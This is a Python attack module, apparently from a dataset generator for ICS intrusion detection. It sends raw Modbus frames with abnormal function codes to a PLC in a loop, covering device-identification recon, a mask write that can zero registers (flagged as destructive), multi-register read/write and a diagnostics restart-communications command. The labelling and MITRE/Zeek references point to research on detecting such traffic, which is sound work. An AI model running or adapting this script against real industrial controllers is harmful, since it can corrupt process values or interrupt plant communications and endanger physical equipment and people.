"""
Attack #12: Modbus Abuse (Function Code Misuse)
==================================================
SCADANet stats: 596 packets, Tcp_len=12, frame_delta≈0.0s -> ~2 pkt/s
Sends abnormal function codes over the legitimate Modbus protocol.
Effect: PLC attempts operations it does not expect, returning error/exception codes.

MITRE ATT&CK for ICS: T0855 - Unauthorized Command Message
Zeek signature: modbus.log -> function, exception
"""

import time
import sys
import os
import socket
import random

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from network_attacks.net_config import (
    PLC_IP, MODBUS_PORT, DEFAULT_NET_DURATION,
    LABEL_MODBUS_ABUSE, NET_DURATIONS
)

ATTACK_NAME = "Modbus_Abuse"
ATTACK_ID   = LABEL_MODBUS_ABUSE

# SCADANet: ~2 pkt/s
PKT_INTERVAL = 0.5

# Modbus PDUs for abuse scenarios (Transaction ID + Protocol ID etc. in the TCP packet)
# mbap = b'\x00\x01\x00\x00\x00\x06\x01' (Trans=1, Proto=0, Len=6, Unit=1)
ABUSE_SCENARIOS = [
    # 1. Read Device Identification (FC 43) - Recon
    b'\x00\x01\x00\x00\x00\x05\x01\x2b\x0e\x01\x00',
    # 2. Mask Write Register (FC 22) - Destructive if supported
    b'\x00\x02\x00\x00\x00\x08\x01\x16\x00\x00\xff\xff\x00\x00',
    # 3. Read/Write Multiple Registers (FC 23)
    b'\x00\x03\x00\x00\x00\x0b\x01\x17\x00\x00\x00\x01\x00\x00\x00\x01\x02\xff\xff',
    # 4. Diagnostics (FC 8) - Sub-function Restart Communications Option
    b'\x00\x04\x00\x00\x00\x06\x01\x08\x00\x01\xff\x00',
    # 5. Get Com Event Counter (FC 11)
    b'\x00\x05\x00\x00\x00\x02\x01\x0b',
]

def run_attack(duration_sec=None, label_manager=None, target_ip=None):
    if duration_sec is None:
        duration_sec = NET_DURATIONS.get("modbus_abuse", DEFAULT_NET_DURATION)
    if target_ip is None:
        target_ip = PLC_IP

    print(f"{'='*65}")
    print(f"  ATTACK #{ATTACK_ID}: {ATTACK_NAME}")
    print(f"  Target: {target_ip}:{MODBUS_PORT}")
    print(f"  Scenario: abnormal Modbus FC requests (FC22, FC23, FC43, etc.)")
    print(f"  Rate: ~2 pkt/s (SCADANet calibration)")
    print(f"  Duration: {duration_sec}s")
    print(f"{'='*65}")

    if label_manager:
        label_manager.log_attack_start(
            ATTACK_ID, ATTACK_NAME,
            f"Modbus Abuse -> {target_ip}:{MODBUS_PORT}, abnormal FCs"
        )

    start_time    = time.time()
    req_count     = 0

    try:
        while (time.time() - start_time) < duration_sec:
            payload = random.choice(ABUSE_SCENARIOS)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2.0)
                s.connect((target_ip, MODBUS_PORT))
                s.sendall(payload)
                resp = s.recv(128)
                s.close()
                req_count += 1
            except Exception:
                pass # Ignore errors

            if req_count > 0 and req_count % 10 == 0:
                elapsed = time.time() - start_time
                rem     = duration_sec - elapsed
                print(f"  [M_ABUSE] {req_count} requests | remaining: {rem:.0f}s")

            time.sleep(PKT_INTERVAL)

    except KeyboardInterrupt:
        print("\n  [M_ABUSE] Manual stop!")
    finally:
        elapsed = time.time() - start_time
        if label_manager:
            label_manager.log_attack_end(
                ATTACK_ID, ATTACK_NAME,
                f"{req_count} requests, {elapsed:.1f}s"
            )
        print(f"\n  [M_ABUSE] {req_count} requests | {elapsed:.1f}s")
    return True


if __name__ == "__main__":
    run_attack(duration_sec=60)
